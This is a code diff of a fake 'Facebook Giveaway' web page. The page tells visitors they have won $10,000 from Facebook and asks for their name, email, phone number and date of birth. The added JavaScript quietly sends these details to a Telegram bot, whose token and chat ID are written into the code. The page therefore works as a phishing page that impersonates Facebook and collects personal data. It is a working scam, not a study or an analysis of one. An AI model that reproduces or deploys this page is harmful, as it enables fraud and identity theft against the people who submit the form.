@@ -4,15 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Giveaway</title>
-    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
-    <script>
-        window.OneSignalDeferred = window.OneSignalDeferred || [];
-        OneSignalDeferred.push(async function(OneSignal) {
-            await OneSignal.init({
-                appId: "43138956-e594-4d8f-b24f-aa8ec45ad652",
-            });
-        });
-    </script>
     <style>
         body { 
             font-family: Arial, sans-serif; 
@@ -21,12 +12,11 @@
             color: white; 
         }
         .container { 
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            width: 100%;
+            margin-top: 50px; 
+        }
+        .facebook-logo {
+            width: 80px;
+            height: auto;
         }
         .winner { 
             font-size: 24px; 
@@ -40,31 +30,39 @@
             border-radius: 10px;
             width: 300px;
             margin: auto;
+            display: none; /* Form hidden initially */
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Facebook Logo -->
+        <img src="facebook-logo.png" alt="Facebook Logo" class="facebook-logo">
+
         <h1>🎉 Congratulations, <span id="winner-name">John Doe</span>! 🎉</h1>
         <p>You have won $10,000 cash from Facebook!</p>
-        <div class="form-container">
+
+        <!-- Form (Hidden Initially) -->
+        <div class="form-container" id="giveaway-form">
             <h2>Claim Your Prize</h2>
-            <form action="submit.php" method="POST">
+            <form id="claimForm">
                 <label>Full Name:</label><br>
-                <input type="text" name="fullname" required><br><br>
+                <input type="text" name="fullname" id="fullname" required><br><br>
                 
                 <label>Email Address:</label><br>
-                <input type="email" name="email" required><br><br>
+                <input type="email" name="email" id="email" required><br><br>
                 
                 <label>Phone Number:</label><br>
-                <input type="tel" name="phone" required><br><br>
+                <input type="tel" name="phone" id="phone" required><br><br>
                 
                 <label>Date of Birth:</label><br>
-                <input type="date" name="dob" required><br><br>
+                <input type="date" name="dob" id="dob" required><br><br>
                 
                 <button type="submit">Claim Now</button>
             </form>
         </div>
+
+        <!-- Winner's Image -->
         <h2>Previous Winners</h2>
         <div class="winner">
             <img src="winner1.jpg" alt="Winner" width="100"><br>
@@ -73,9 +71,42 @@
     </div>
 
     <script>
+        // Show alert first, then reveal form when OK is clicked
         window.onload = function() {
-            alert("🎉 Congratulations! You have won $10,000 cash from Facebook! Click OK to claim your prize.");
+            setTimeout(function() {
+                alert("🎉 Congratulations! You have won $10,000 cash from Facebook! Click OK to claim your prize.");
+                document.getElementById("giveaway-form").style.display = "block";
+            }, 500);
         };
+
+        // Telegram Bot Integration
+        document.getElementById("claimForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let fullname = document.getElementById("fullname").value;
+            let email = document.getElementById("email").value;
+            let phone = document.getElementById("phone").value;
+            let dob = document.getElementById("dob").value;
+
+            let message = `🎉 New Giveaway Entry!\n\n👤 Name: ${fullname}\n📧 Email: ${email}\n📞 Phone: ${phone}\n🎂 DOB: ${dob}`;
+            
+            let telegramBotToken = "7540369556:AAH7gDIVcjCRomnXQgLBGkbk5qF6BUdCjX4";
+            let telegramChatId = "7635429842";
+
+            let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("✅ Your details have been submitted successfully!");
+                        document.getElementById("claimForm").reset();
+                    } else {
+                        alert("❌ Error submitting details. Please try again.");
+                    }
+                })
+                .catch(error => alert("❌ Network error. Please try again."));
+        });
     </script>
 </body>
-</html>
+    </html>
